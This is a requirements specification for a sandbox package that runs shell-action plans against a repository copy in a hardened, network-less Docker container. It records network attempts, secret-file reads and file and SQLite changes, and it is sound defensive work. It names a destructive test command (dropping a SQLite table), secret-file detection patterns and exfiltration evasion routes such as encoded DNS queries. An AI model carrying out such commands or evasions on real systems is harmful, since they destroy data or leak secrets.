# Requirements Document

## Introduction

The `ghost-runner` package rehearses a plan (a list of shell actions) against a real repository inside a sealed Docker box and returns a `GhostReport` that the `core` Ward_Engine can evaluate. The package copies the repository, starts a hardened container with `--network none` that mounts only the copy, runs each action, records network attempts and secret-file reads, computes a per-step diff of the copy (including per-table SQLite row counts), and verifies that the original repository did not change. When Docker is unavailable, the package falls back to static analysis (Plan B) and states explicitly that P1 isolation is not claimed.

The package is a separate pnpm workspace package at `ghost-runner/` (package name `@ghost-run/ghost-runner`). It depends on `core/`. `core/` does not depend on it. It is not located under `integrations/`.

Dependency and assumption: the Change kinds of the runner follow `core/src/types.ts`. That file knows the file Change kinds `file-created`, `file-overwritten`, and `file-deleted` and the SQLite kind `sql-row-count`, and it does not yet contain `symlink-changed`, the optional `dropped` field of `sql-row-count`, the optional `eventId` of `ObservedEvent`, or the `secretValues` hand-off type. The `core` Ward_Engine does not yet treat `symlink-changed` as an overwrite for `path` wards. The ghost-runner implementation makes these core changes first, before any other runner work (Requirement 1 criteria 6 and 7). Facts with no core Change kind (a mode-only change, an unreadable SQLite file) are reported as Diagnostics, not as Change kinds.

The requirements reflect experiment A (11/18, reference repository of 3,945 files, Apple M1, Docker Desktop):

| Measurement | Value |
|---|---|
| Folder-level `clonefile(2)` copy | 36 ms |
| `cp -cR` (per-file clone) copy | 778 ms |
| Fresh container per run (start, run, remove) | 0.26 to 0.42 s |
| Pre-started one-shot container with empty slot folder | 0.16 to 0.31 s |
| `npm test` with `--network none` and no DNS recorder | 5.2 s (each DNS lookup stalls about 5 s) |
| `npm test` with `--dns 127.0.0.1` and in-box fake DNS | 0.3 to 0.6 s |
| `strace` on `connect` | +0.1 to 0.8 s, no `SYS_PTRACE` needed |
| Hashing only entries whose `ctime` is later than `copiedAt` | median 88 ms |
| `npm install` offline | exceeds 58 s |

## Glossary

- **Box_Runner**: The package `@ghost-run/ghost-runner`. It implements the Docker-box real-mode ghost run for repositories and is the only component that starts containers.
- **Repo_World**: The `World<RepoState, ShellAction>` implementation exported by Box_Runner.
- **Original**: The repository directory on the host that the user points Box_Runner at. Box_Runner reads Original and never writes to it.
- **Copy**: A directory on the host created by the Copier from Original. The Copy is the only host path mounted into the Box (plus optional read-only excluded-directory mounts, see Requirement 4).
- **Copier**: The Box_Runner component that creates the Copy.
- **copiedAt**: The timestamp, recorded with nanosecond resolution immediately after the Copier finishes, used as the lower bound for `ctime` candidates in the Differ.
- **Box**: A Docker container started with `--network none` and hardened as specified in Requirement 5, in which actions run.
- **Pool_Slot**: A pre-started one-shot Box with an empty slot folder mounted, waiting to receive one Copy.
- **Recorder**: The in-Box component set that records network attempts (fake DNS, HTTP and TLS-SNI listeners, `strace` on `connect`) and secret-file reads (`strace` on `openat`).
- **Differ**: The Box_Runner component that computes `Change[]` between two states of the Copy.
- **Fingerprinter**: The Box_Runner component that computes a `FingerprintResult` for Original.
- **Static_Analyzer**: The Box_Runner component that performs Plan B analysis without executing any action.
- **ShellAction**: An action of the form `{ command: string, cwd?: string }`, where `cwd` is a path relative to the Copy root.
- **Plan**: An ordered list of 1 to 50 ShellActions.
- **Run_Result**: The value returned by Box_Runner for one Plan: a `GhostReport`, the runner verdict, isolation metadata, and diagnostics.
- **Runner_Verdict**: The maximum, in `pass < warn < block` order, of the verdict from `WardEngine.evaluate` and the runner-level verdict floor defined in Requirement 14.
- **Reference_Repo**: A fixture repository of 3,945 files used for timing measurements.
- **Reference_Machine**: An Apple M1 machine running Docker Desktop.
- **Canary**: A fake secret value such as `sk-CANARY-abc123`.
- **secretValues**: The in-memory collection of the contents of Copy files that match the `secrets` patterns of the `egress` wards in the evaluated `WardSet`, passed together with the `GhostReport` to the Ward_Engine. Its type is defined in `core`.
- **eventId**: An optional string field of the core `ObservedEvent`. The Box_Runner assigns a unique `eventId` to each event that has a captured payload.
- **RunOutput**: The in-memory value returned by the Box_Runner pipeline. It holds the Run_Result and `payloads`, a map from `eventId` to the captured payload bytes. `payloads` is never serialized.
- **Core_Type_Extensions**: The additions to `core` that the runner needs: in `core/src/types.ts`, the `symlink-changed` Change kind (added to the `FileChange` kinds), the optional `dropped` field of `SqlRowCountChange`, the optional `eventId` field of `ObservedEvent`, and the `secretValues` hand-off type; and in `core/src/wards.ts`, the rule that a `symlink-changed` Change counts as an overwrite of its path for `path` wards.
- **Diagnostic**: A named, structured entry of the Run_Result `diagnostics` list (for example `mode-changed`, `sqlite-unreadable`, `recorder-failure`). A Diagnostic is not a Change and is not passed to the Ward_Engine as a Change.
- **Ward_Engine**: The `core` component that evaluates a `GhostReport` against a `WardSet` (`WardEngine.evaluate`).
- **Plan_B**: The static-analysis fallback used when the Box cannot be used.
- **Hook_Limit**: The 60-second execution limit of the Kiro Pre Tool Use hook.
- **Median_Of_5**: The median of the durations of 5 consecutive runs of the same measurement on the Reference_Machine. A target stated as a Median_Of_5 is met when the median does not exceed the stated value; a single slower run does not violate it (experiment A: `cp -cR` median 0.78 s, maximum 2.3 s).
- **Absolute_Limit**: A timeout or deadline that applies to every single run, with no averaging: Docker availability check 2 s, copy 20 s, Box execution 30 s, pipeline 55 s.

## Requirements

### Requirement 1: Package Placement and Dependency Direction

**User Story:** As a maintainer, I want `ghost-runner` to be a separate package that builds on `core/`, so that `core/` stays dependency-free and the hook, MCP server, and apps share one runner.

#### Acceptance Criteria

1. THE Box_Runner SHALL be a pnpm workspace package located at `ghost-runner/` in the repository root, with the package name `@ghost-run/ghost-runner`, and SHALL be listed in `pnpm-workspace.yaml`.
2. THE Box_Runner SHALL declare `@ghost-run/core` as its only workspace dependency and SHALL import `core` types and functions only through the public entry point of `@ghost-run/core`.
3. THE `core/` package SHALL contain no import path that resolves to `ghost-runner/`; an ESLint `no-restricted-imports` rule SHALL enforce this and `pnpm lint` SHALL fail when the rule is violated.
4. THE Box_Runner SHALL target Node.js 20 or later and SHALL contain no call to any LLM API.
5. THE Box_Runner SHALL list every third-party library it uses, with its license, in the repository README table before the package is merged.
6. THE ghost-runner implementation SHALL implement the Core_Type_Extensions in `core/src/types.ts` and `core/src/wards.ts` (and export the new types through the public entry point of `@ghost-run/core`) as its first implementation work, before any other runner functionality, so that every later runner task compiles against the extended types.
7. WHEN the Core_Type_Extensions are complete, THE existing 35 `core` tests SHALL still pass, and new Ward_Engine unit tests SHALL cover each new kind and field: a `symlink-changed` Change on a protected path produces a `path` ward violation for the `overwrite` operation, a `sql-row-count` Change with `dropped: true` is counted as rows lost, an `ObservedEvent` with `eventId` is accepted, and `secretValues` is accepted by `WardEngine.evaluate` and never appears in the returned `WardVerdict`.

### Requirement 2: Repo_World Implements the World Contract

**User Story:** As a world author and as the PBT harness, I want the repository world to implement all six `World<S, A>` functions, so that it inherits the ghost runner, wards engine, and UI kit.

#### Acceptance Criteria

1. THE Repo_World SHALL implement `snapshot`, `step`, `diff`, `render`, `fingerprint`, and `effectsOutside` with the signatures of `World<S, A>` from `core`, such that the TypeScript compiler reports no error for the declaration `const w: World<RepoState, ShellAction> = repoWorld`.
2. WHEN `snapshot()` is called, THE Repo_World SHALL return a `Snapshot<RepoState>` that refers to a newly created Copy and SHALL leave Original unchanged, as measured by equal `fingerprint().hash` values before and after the call.
3. WHEN `step(s, a)` is called, THE Repo_World SHALL execute `a` inside a Box against a new Copy cloned from the directory referred to by `s`, SHALL return a new `Snapshot<RepoState>` referring to that new Copy, and SHALL leave the directory referred to by `s` structurally identical (same entries, types, sizes, and content hashes) to its state before the call.
4. IF the action in `step(s, a)` exits with a non-zero exit code or is killed by the timeout, THEN THE Repo_World SHALL return a `Snapshot<RepoState>` whose `result` is `{ success: false, error: "<non-empty description>" }` and SHALL NOT throw.
5. WHEN `diff(before, after)` is called, THE Repo_World SHALL return the `Change[]` defined in Requirement 11 and Requirement 12, and the call SHALL be pure with respect to the Snapshots.
6. WHEN `render(s)` is called, THE Repo_World SHALL return a `Scene` containing the file tree of the Copy (relative paths, entry types, sizes) such that `JSON.parse(JSON.stringify(scene))` is recursively structurally equal to `scene`.
7. WHEN `effectsOutside(a)` is called with a ShellAction that contains a statically detectable external destination (an absolute path outside the Copy root, a path starting with `~`, a URL, or a database connection string), THE Repo_World SHALL return one `Effect` per destination, each with a non-empty `destination` string, without performing any file I/O or network call.
8. WHEN `effectsOutside(a)` is called with a ShellAction that has no statically detectable external destination, THE Repo_World SHALL return an empty array.
9. THE Repo_World SHALL register the metadata `deterministic: false`, so that P2 is not asserted for it.

### Requirement 3: Isolation Mode Selection and Plan B Disclosure

**User Story:** As a user, I want to know whether the run used the Docker box or only static analysis, so that I never assume an isolation guarantee that does not hold.

#### Acceptance Criteria

1. WHEN a ghost run starts, THE Box_Runner SHALL check Docker availability (daemon reachable and box image present) and SHALL complete the check within 2.0 s.
2. IF the Docker daemon is unreachable, the check does not complete within 2.0 s, or the box image is absent, THEN THE Box_Runner SHALL select Plan_B, SHALL NOT execute any action of the Plan on the host, and SHALL set `isolation.mode` to `"static-analysis"` and `isolation.reason` to `"docker-unavailable"` or `"box-image-missing"`.
3. WHILE `isolation.mode` is `"static-analysis"`, THE Box_Runner SHALL set `isolation.p1Claimed`, `isolation.p5Claimed`, and `isolation.p6Claimed` to `false`.
4. WHILE `isolation.mode` is `"static-analysis"`, THE Box_Runner SHALL include in the Run_Result the exact message `"P1 isolation is NOT guaranteed: Docker box unavailable, static analysis only."`.
5. WHILE `isolation.mode` is `"docker-box"`, THE Box_Runner SHALL set `isolation.p1Claimed` to `true` only when the post-run Original fingerprint equals the pre-run Original fingerprint and the mount audit of Requirement 5 passed.
6. THE README of the Box_Runner SHALL state the Plan_B limitation (no P1, P5, or P6 claim) and the macOS and Linux support scope, and SHALL mark Windows as unverified.

### Requirement 4: Copy of the Repository

**User Story:** As the ghost runner, I want a fast, faithful copy of the repository that does not follow links out of the repository, so that the Box never sees host data outside the Copy.

#### Acceptance Criteria

1. WHEN the Copier runs on macOS, THE Copier SHALL create the Copy with `cp -cR` (per-file APFS clone); WHEN the Copier runs on Linux, THE Copier SHALL create the Copy with `cp --reflink=auto -R`.
2. THE Copier SHALL create the Copy on the same volume as Original when a writable location exists there; IF the Copy is created on a different volume, THEN THE Copier SHALL still complete the copy and SHALL record `copy.cloned: false` in the Run_Result.
3. THE Copier SHALL exclude every directory whose name is in the configurable exclusion list, which defaults to `["node_modules"]`, at every depth, so that the Copy contains no directory with an excluded name.
4. THE Copier SHALL preserve symbolic links as symbolic links and SHALL NOT copy the content of any file reached through a symbolic link that points outside Original.
5. WHEN the Copier finishes, THE Copier SHALL record `copiedAt` within 10 ms after the last copy operation returns.
6. THE Copier SHALL complete the copy of the Reference_Repo with a Median_Of_5 of at most 1.0 s on the Reference_Machine.
7. WHERE a faster folder-level clone helper is configured, THE Copier SHALL use the helper in place of `cp -cR` and SHALL produce a Copy that satisfies criteria 3 and 4.
8. IF the Copier does not finish within 20 s, THEN THE Box_Runner SHALL abort the copy, remove the partial Copy, return a Run_Result with `status: "copy-timeout"` and Runner_Verdict `warn`, and SHALL NOT start a Box.
9. WHERE the option `excludedDirMode` is set to `"readonly-mount"`, THE Box_Runner SHALL mount each excluded top-level directory of Original into the Box with the read-only flag at the same relative path and SHALL list each such mount in `isolation.readOnlyMounts`; WHERE the option is not set, THE Box_Runner SHALL use the default `"omit"` and SHALL mount no path other than the Copy.
10. THE Differ and the Fingerprinter SHALL ignore the excluded directories, so that a change inside an excluded directory of Original produces no entry in `changedPaths` and no Change.
11. IF a `path` ward in the evaluated `WardSet` protects a path that lies inside an excluded directory (for example `node_modules/.bin/tool` when `node_modules` is excluded), THEN THE Box_Runner SHALL detect this case before the first action runs, SHALL add the diagnostic `protected-path-excluded` listing the ward `id` and the protected path, SHALL state in the report that changes at that path are not visible to the Differ, and SHALL set Runner_Verdict to at least `warn`; this applies in both `excludedDirMode` values.

### Requirement 5: Box Launch and Hardening

**User Story:** As a security reviewer, I want every ghost action to run in a hardened, network-less, single-use container that sees only the Copy, so that the ghost cannot reach the host or other runs.

#### Acceptance Criteria

1. THE Box_Runner SHALL start every Box with `--network none`, `--dns 127.0.0.1`, `--cap-drop ALL`, `--security-opt no-new-privileges`, `--pids-limit`, `--memory`, `--cpus`, `--read-only`, and a `--tmpfs` mount for `/tmp`.
2. THE Box_Runner SHALL use the configurable defaults `--pids-limit 256`, `--memory 1g` (with equal memory-swap), `--cpus 2`, and a 64 MiB tmpfs for `/tmp`, and the scenarios of Requirement 18 SHALL pass under these defaults.
3. THE Box_Runner SHALL mount exactly one host path read-write, the Copy, and SHALL mount no other host path except the read-only mounts of Requirement 4 criterion 9.
4. THE Box_Runner SHALL NOT pass `--privileged`, `--cap-add`, `--network` with a value other than `none`, `--pid host`, `--ipc host`, or any mount whose source is the Docker socket, the home directory, or a parent directory of Original.
5. THE Box_Runner SHALL use a fresh container for every run and SHALL NOT run actions from two different runs in the same container.
6. WHEN the Box is created and before the first action executes, THE Box_Runner SHALL inspect the container (`docker inspect`) and compare its mount set, network mode, privileged flag, and added capabilities with the expected values, and SHALL complete the inspection with a Median_Of_5 of at most 0.3 s.
7. IF the inspected configuration differs from the expected values, THEN THE Box_Runner SHALL remove the container, SHALL NOT execute any action, and SHALL return a Run_Result with `status: "isolation-violation"` and Runner_Verdict `block`.
8. THE Box_Runner SHALL pass to the Box only these environment variables: `PATH`, `HOME` set to a directory under `/tmp`, `CI=true`, and `NPM_CONFIG_UPDATE_NOTIFIER=false`, and SHALL NOT forward any other variable from the host environment.
9. THE Box_Runner SHALL start the Docker CLI with an argument array and no intermediate shell, and SHALL pass each action string to the Box as a single argument of `sh -c`.
10. THE Box_Runner SHALL start and remove a fresh Box for the Reference_Repo with a Median_Of_5 overhead of at most 0.5 s (container start plus remove, excluding action execution and the inspection of criterion 6) on the Reference_Machine.

### Requirement 6: Optional Pool of Pre-Started One-Shot Boxes

**User Story:** As a hook user, I want a pool of ready containers to cut start-up latency, so that the ghost gate stays fast without sharing state between runs.

#### Acceptance Criteria

1. WHERE the option `pool.size` is set to an integer from 1 to 8, THE Box_Runner SHALL keep that many Pool_Slots started in the background, each with `--network none` and the hardening of Requirement 5, an empty slot folder mounted, and the label `ghost-run.pool=1`.
2. WHEN a run uses a Pool_Slot, THE Copier SHALL create the Copy inside the slot folder of that Pool_Slot.
3. THE Box_Runner SHALL use each Pool_Slot for at most one run, SHALL remove the container and delete the slot folder after that run, and SHALL start a replacement Pool_Slot outside the timing of the run.
4. THE Box_Runner SHALL mount in each Pool_Slot only its own slot folder, so that no Pool_Slot has access to the slot folder of another Pool_Slot or to Original.
5. THE Box_Runner SHALL NOT keep any long-lived container that serves more than one run.
6. WHERE the pool is enabled and a Pool_Slot is ready, THE Box_Runner SHALL complete the container overhead of criterion 10 of Requirement 5 with a Median_Of_5 of at most 0.35 s on the Reference_Machine.
7. WHEN the Box_Runner process exits normally, THE Box_Runner SHALL remove all containers labeled `ghost-run.pool=1` that it started within 5 s.
8. WHEN the Box_Runner starts, THE Box_Runner SHALL remove containers labeled `ghost-run.pool=1` that were left by an earlier process.
9. IF no Pool_Slot is ready when a run starts, THEN THE Box_Runner SHALL fall back to a fresh container and SHALL record `box.source: "fresh"` in the Run_Result.

### Requirement 7: Action Execution, Timeout, and Pipeline Deadline

**User Story:** As a hook user, I want each plan to finish inside the hook limit even when a command hangs or runs long, so that the hook never fails by timeout.

#### Acceptance Criteria

1. WHEN a Plan is submitted, THE Box_Runner SHALL accept Plans of 1 to 50 ShellActions and SHALL return an error describing the violated bound for a Plan outside that range, without starting a Box.
2. THE Box_Runner SHALL execute the ShellActions of a Plan sequentially in the same Box, in list order, and SHALL tag every recorded event with the zero-based index of the ShellAction as `stepIndex`.
3. THE Box_Runner SHALL apply a total Box execution limit to the whole Plan, configurable from 1 s to 30 s, with a default of 25 s; THE Box_Runner SHALL reject a configured value outside that range with an error.
4. IF the total Box execution limit is reached while an action is running, THEN THE Box_Runner SHALL kill the container, SHALL mark that step's Snapshot with `result: { success: false, error: "timeout after <N> s" }`, SHALL NOT execute the remaining actions, SHALL return the diff computed so far, and SHALL set Runner_Verdict to at least `warn` with `status: "timeout"`.
5. THE Box_Runner SHALL set an overall pipeline deadline of 55 s, measured from the start of the run to the return of the Run_Result.
6. IF the overall pipeline deadline is reached, THEN THE Box_Runner SHALL stop the remaining phases, kill and remove the container, return the partial Run_Result with `status: "pipeline-deadline"` and Runner_Verdict at least `warn`, and SHALL return within 60 s of the start of the run.
7. WHEN a ShellAction contains a command such as `npm install` that needs network access, THE Box SHALL execute it without network access, and THE Box_Runner SHALL record the resulting network attempts as events (Requirement 8) rather than permitting the access.
8. THE Box_Runner SHALL record the exit code of every executed action in the Run_Result.

### Requirement 8: Network Attempt Recording

**User Story:** As the ward engine, I want every network attempt of the ghost recorded with its destination and payload, so that exfiltration (P6) is detected by action and by content.

#### Acceptance Criteria

1. WHILE a Box is running, THE Recorder SHALL run a fake DNS server inside the Box on `127.0.0.1` that answers every A query with a loopback address, so that the Median_Of_5 of the DNS lookup latency is at most 0.1 s and no lookup waits for the 5 s resolver timeout.
2. WHEN `npm test` runs in the Box for the Reference_Repo on the Reference_Machine, THE Box_Runner SHALL complete the action with a Median_Of_5 of less than 1.0 s with the fake DNS active (measured 0.3 to 0.6 s; 5.2 s without the Recorder).
3. WHEN an action resolves a hostname, THE Recorder SHALL emit an `ObservedEvent` with `kind: "network-attempt"` and `destination` equal to the lowercase hostname.
4. WHEN an action sends an HTTP request to a resolved name, THE Recorder SHALL capture the request body up to 64 KiB and SHALL emit an `ObservedEvent` with `kind: "network-attempt"` and `destination` equal to `<host>:<port>`.
5. WHEN an action opens a TLS connection to a resolved name, THE Recorder SHALL capture the SNI server name and SHALL emit an `ObservedEvent` with `kind: "network-attempt"` and `destination` equal to `<sni>:<port>`.
6. WHEN an action attempts a TCP connection to a port that has no HTTP or TLS handler, such as port 5432 on a resolved name, THE Recorder SHALL emit an `ObservedEvent` with `kind: "network-attempt"` and `destination` equal to `<host>:<port>`.
7. WHEN an action connects directly to an IP address without a DNS lookup (for example `192.0.2.10:443`), THE Recorder SHALL detect the attempt through `strace` on the `connect` system call and SHALL emit an `ObservedEvent` with `kind: "network-attempt"` and `destination` equal to `<ip>:<port>`.
8. THE Recorder SHALL run `strace` without adding the `SYS_PTRACE` capability to the Box.
9. THE Box_Runner SHALL emit at most one `ObservedEvent` per distinct pair of (`stepIndex`, `destination`) and SHALL record the detection source (`dns`, `http`, `tls-sni`, `tcp`, or `strace-connect`) of each event in the diagnostics of the Run_Result.
10. THE Box_Runner SHALL map every network event to the `ObservedEvent` kind `"network-attempt"` and SHALL use no other `kind` value for network events.
11. THE Box_Runner SHALL return captured payloads to the caller in memory in `RunOutput.payloads` for ward content inspection, and the serialized Run_Result (JSON and graveyard output) SHALL contain, for each capture, only its byte length and SHA-256 hash and SHALL NOT contain the payload bytes.
12. WHEN `npm test` runs in the Box with `NPM_CONFIG_UPDATE_NOTIFIER=false`, THE Recorder SHALL record no event with destination `registry.npmjs.org`.
13. THE Box_Runner SHALL include a verification test that starts the Box with the hardening options of Requirement 5 (including `--cap-drop ALL`) and asserts that the fake DNS server binds port 53 and the HTTP and TLS listeners bind ports 80 and 443; the test SHALL report `skipped (docker unavailable)` when Docker is unavailable.
14. WHEN an event has a captured payload, THE Box_Runner SHALL assign the event a unique `eventId`, SHALL store the payload in `RunOutput.payloads` under that `eventId`, and SHALL record the same `eventId` in the `ObservedEvent`, so that every key of `RunOutput.payloads` equals the `eventId` of exactly one event in `report.observedEvents`.
15. THE Box_Runner SHALL leave `eventId` unset on events without a captured payload.

### Requirement 9: Secret-File Read Recording

**User Story:** As the ward engine, I want reads of secret files recorded, so that "secret read, then unapproved network attempt" (P6) can be judged by action.

#### Acceptance Criteria

1. WHERE the evaluated `WardSet` contains an `egress` ward or the option `secretPatterns` is set, THE Box_Runner SHALL record reads of files matching the secret glob patterns (for example `.env` and `**/*.pem`) under the Copy root.
2. WHEN an action opens a file in the Copy whose Copy-relative path matches a secret pattern, THE Recorder SHALL emit an `ObservedEvent` with `kind: "secret-read"` and `path` equal to the Copy-relative path using `/` separators.
3. THE Box_Runner SHALL emit at most one `secret-read` event per distinct pair of (`stepIndex`, `path`).
4. THE Box_Runner SHALL NOT write the content of any secret file, including a Canary value, to disk, to the serialized Run_Result, to logs, or to graveyard output; the only permitted holder of secret file content is process memory (criteria 9 to 11).
5. THE design phase SHALL choose the recording method (for example `strace` on `openat`) and its cost based on a measured trial, and the trial SHALL be a task of this spec.
6. THE trial SHALL measure, on the Reference_Repo and the Reference_Machine, the median added latency of secret-read recording over at least 10 runs each (reported as a median) for a no-op command and for `npm test`, and SHALL record the results in `docs/research.md`.
7. UNTIL the trial is complete, THE timing budget row for secret-read recording SHALL be provisional with an upper bound of 0.8 s on the Median_Of_5, and the design SHALL revise that bound to the measured value.
8. IF the recording method for secret reads is not active in a run (not configured, tool missing, or failed to start), THEN THE Box_Runner SHALL set `isolation.p6Claimed` to `false` and SHALL set Runner_Verdict to at least `warn`.
9. WHERE the evaluated `WardSet` contains an `egress` ward, THE Box_Runner SHALL, before the first action of the Plan executes, read from the Copy (not from Original) into memory only the contents of the files that match the `secrets` patterns of the `egress` wards, and SHALL hold them as `secretValues`.
10. WHEN the Box_Runner calls the Ward_Engine, THE Box_Runner SHALL pass `secretValues` together with the `GhostReport` and the `WardSet`, using the hand-off type defined in `core`.
11. THE Box_Runner SHALL NOT write `secretValues`, or any value derived from it other than a byte length or SHA-256 hash, to disk, to the serialized Run_Result, to logs, or to graveyard output, and SHALL NOT include `secretValues` in `RunOutput.payloads`.
12. WHEN the Box_Runner has passed `secretValues` to the Ward_Engine and the evaluation has returned, THE Box_Runner SHALL release its reference to `secretValues` before the Run_Result is returned to the caller.
13. IF a file matching an `egress` ward secrets pattern cannot be read from the Copy, THEN THE Box_Runner SHALL add the diagnostic `secret-values-unreadable` listing the Copy-relative path (not content), SHALL set `isolation.p6Claimed` to `false`, and SHALL set Runner_Verdict to at least `warn`.
14. THE Box_Runner SHALL include a test that runs a Plan against a fixture whose secret file contains a Canary, and SHALL assert that the serialized Run_Result, the serialized `report`, the log output, the graveyard output, and every file written outside the Copy contain neither the Canary nor any substring of the secret file content longer than 8 bytes.
15. THE Box_Runner SHALL read at most 16 files and at most 65,536 bytes per file into `secretValues`, choosing and truncating in byte order of the Copy-relative path; for each file beyond the count or truncated, THE Box_Runner SHALL add the diagnostic `secret-values-capped` with the Copy-relative path, the original byte length, and the cap, and no content; the Behavior_Criterion of Requirement 8 SHALL still apply to all secret files, and the caps SHALL NOT change where `secretValues` may be written (criterion 11).

### Requirement 10: Recorder Integrity and Limitations

**User Story:** As a security reviewer, I want the recorder's limits stated and handled fail-safe, so that the report never overstates what was observed.

#### Acceptance Criteria

1. THE Run_Result SHALL include `recorder.location: "in-box"` and `recorder.tamperResistant: false`.
2. THE README and the Run_Result diagnostics SHALL state that the Recorder runs inside the Box and that a ghost process can delete or forge its records.
3. THE Box_Runner SHALL write the Recorder output to a location that is not inside the Copy, so that Recorder files never appear as Changes.
4. IF the Recorder output is missing, truncated, or unparseable after a step, THEN THE Box_Runner SHALL set `isolation.p6Claimed` to `false`, SHALL add the diagnostic `recorder-failure`, and SHALL set Runner_Verdict to at least `warn`.
5. THE Box_Runner SHALL NOT claim detection of connection attempts through Unix domain sockets, through a process that the Recorder does not trace, or through names that bypass the fake DNS and the traced `connect` call.
6. WHERE a ghost action reads a secret file and sends its content to a destination encoded by compression, encryption, or one-character-at-a-time DNS queries, THE Box_Runner SHALL rely on the action criterion (secret-read followed by network-attempt) and SHALL NOT claim content detection.

### Requirement 11: Filesystem Diff

**User Story:** As the ward engine and the UI, I want a minimal, link-safe, fast diff of the Copy after each step, so that deletes and overwrites of protected paths are visible in the Hook_Limit.

#### Acceptance Criteria

1. THE Differ SHALL walk the Copy with `lstat` and SHALL NOT follow symbolic links, so that the walk never leaves the Copy root.
2. THE Differ SHALL NOT use `diff -rq` or any tool that follows symbolic links.
3. BEFORE the first action runs, THE Box_Runner SHALL record a manifest of the Copy containing, for each entry, the relative path, type, size, mode, `mtime`, and symlink target.
4. AFTER each action, THE Differ SHALL compare the current manifest with the manifest recorded after the previous step (or before the first action) and SHALL hash only regular files whose `ctime` is later than the previous baseline timestamp (`copiedAt` for the first step).
5. WHEN an entry exists after the step but not before, THE Differ SHALL emit a Change `{ kind: "file-created", path, entryType }`.
6. WHEN an entry exists before the step but not after, THE Differ SHALL emit a Change `{ kind: "file-deleted", path, entryType }`.
7. WHEN a regular file has different content after the step, THE Differ SHALL emit a Change `{ kind: "file-overwritten", path, sizeBefore, sizeAfter }`.
8. WHEN only the mode of an entry differs, THE Differ SHALL emit no Change and THE Box_Runner SHALL add the Diagnostic `mode-changed` with `path`, `modeBefore`, `modeAfter`, and `stepIndex`; a mode-only change does not by itself raise Runner_Verdict. Known limitation: `chmod` alone is neither a delete nor an overwrite, so wards do not see it.
9. WHEN a symbolic link has a different target after the step, THE Differ SHALL emit a Change `{ kind: "symlink-changed", path, targetBefore, targetAfter }`, which the Ward_Engine counts as an overwrite of `path` for `path` wards.
10. WHEN a regular file has a later `ctime` or `mtime` but identical size and content hash (for example after `touch`), THE Differ SHALL emit no Change for that file.
11. WHEN an action that changes nothing (for example `pwd`) runs, THE Differ SHALL return an empty array for that step.
12. THE Differ SHALL return the Changes of a step sorted by `path` in ascending byte order, with `kind` as the tie-breaker, so that two diffs of identical states are deep-equal.
13. THE Differ SHALL compute the `Change[]` of a step for the Reference_Repo with a Median_Of_5 of at most 0.5 s on the Reference_Machine, where the median hash time is 88 ms.
14. WHEN an action deletes, moves, or replaces a directory, THE Differ SHALL emit a `file-deleted` Change for every entry of the directory that no longer exists at its original path.

### Requirement 12: SQLite Row-Count Changes

**User Story:** As the ward engine, I want per-table row-count changes for changed SQLite files, so that `DROP TABLE users` is reported as the number of rows lost.

#### Acceptance Criteria

1. BEFORE the first action runs, THE Box_Runner SHALL identify every regular file in the Copy whose first 16 bytes equal the SQLite header string and SHALL record the row count of every table in each such file, including rows held in a `-wal` sidecar file.
2. WHEN the Differ reports a `file-overwritten` or `file-deleted` Change for a SQLite file recorded in criterion 1, THE Box_Runner SHALL compute the per-table row counts of the current file state and SHALL emit, for each table whose row count changed or that no longer exists, one Change `{ kind: "sql-row-count", path, table, rowsBefore, rowsAfter }` (the core `SqlRowCountChange` shape), and SHALL add `dropped: true` when the table no longer exists, in which case `rowsAfter` is `0`.
3. WHEN a table is created in a recorded SQLite file, THE Box_Runner SHALL emit a Change `{ kind: "sql-row-count", path, table, rowsBefore: 0, rowsAfter }` without the `dropped` field.
4. WHEN the fixture database with a `users` table of 1,206 rows is processed by the action `sqlite3 app.db "DROP TABLE users;"`, THE Box_Runner SHALL emit a `sql-row-count` Change with `table: "users"`, `rowsBefore: 1206`, `rowsAfter: 0`, and `dropped: true`.
5. THE Box_Runner SHALL open SQLite files for counting in read-only mode on a temporary duplicate of the file and its sidecar files, so that counting does not modify the Copy.
6. IF a recorded SQLite file cannot be read after the step (corrupt or truncated), THEN THE Box_Runner SHALL emit no `sql-row-count` Change for that file, SHALL add the Diagnostic `sqlite-unreadable` listing the Copy-relative `path` and `stepIndex`, and SHALL set Runner_Verdict to at least `warn`.
7. THE Box_Runner SHALL complete the SQLite row-count step with a Median_Of_5 of at most 0.5 s on the Reference_Machine for a fixture with one SQLite file of at most 10 MiB.
8. THE Box_Runner SHALL emit only Change kinds defined in `core/src/types.ts` after the Core_Type_Extensions (`file-created`, `file-overwritten`, `file-deleted`, `symlink-changed`, `sql-row-count`), and SHALL NOT emit a Change of any other kind, including `file-modified`, `file-mode-changed`, `sqlite-table-rows-changed`, and `sqlite-unreadable`.

### Requirement 13: Original Fingerprint and P1 Check

**User Story:** As a user, I want proof that the original repository did not change during the ghost run, and a clear distinction between a ghost violation and an unrelated host change.

#### Acceptance Criteria

1. THE Box_Runner SHALL compute `Original` fingerprints with `FingerprintResult` from `core`, whose `manifest` holds one hash per tracked file, excluding the excluded directories of Requirement 4.
2. THE Box_Runner SHALL compute the fingerprint of Original before the Copier starts and again after the last action finishes, and SHALL complete each computation with a Median_Of_5 of at most 1.0 s for the Reference_Repo on the Reference_Machine.
3. THE Box_Runner SHALL compare the two fingerprints with `compareFingerprints` and SHALL include `changed` and `changedPaths` in the Run_Result.
4. WHEN the two fingerprint hashes are equal, THE Box_Runner SHALL set `isolation.originalUnchanged` to `true`.
5. IF the two fingerprint hashes differ and the mount audit of Requirement 5 passed, THEN THE Box_Runner SHALL report the difference as `originalChange.classification: "external-change"` together with `changedPaths`, SHALL NOT report it as an isolation violation, SHALL set `isolation.p1Claimed` to `false` for this run, and SHALL set Runner_Verdict to at least `warn`.
6. IF the mount audit of Requirement 5 failed, THEN THE Box_Runner SHALL report `originalChange.classification: "isolation-violation"` and Runner_Verdict `block`.
7. IF the fingerprint cannot be computed because a tracked file is unreadable, THEN THE Box_Runner SHALL return the error naming the unreadable path, SHALL set `isolation.p1Claimed` to `false`, and SHALL set Runner_Verdict to at least `warn`.
8. THE Box_Runner SHALL NOT write to any path of Original at any phase.

### Requirement 14: Run_Result, GhostReport, and Verdict

**User Story:** As the Kiro hook, the MCP server, and the UI, I want one structured result per run that the ward engine can evaluate, so that downstream components need no knowledge of Docker.

#### Acceptance Criteria

1. THE Box_Runner SHALL return a Run_Result whose `report` is a `GhostReport<RepoState>` with `snapshots` (state before the first action and state after each action), `changes` (one `Change[]` per executed action), `effectsOutside` (one `Effect[]` per executed action, from the static analysis of each action), `observedEvents` (events of Requirements 8 and 9), and `variantResults` equal to `[]`, and SHALL return the in-memory `RunOutput.payloads` alongside the Run_Result.
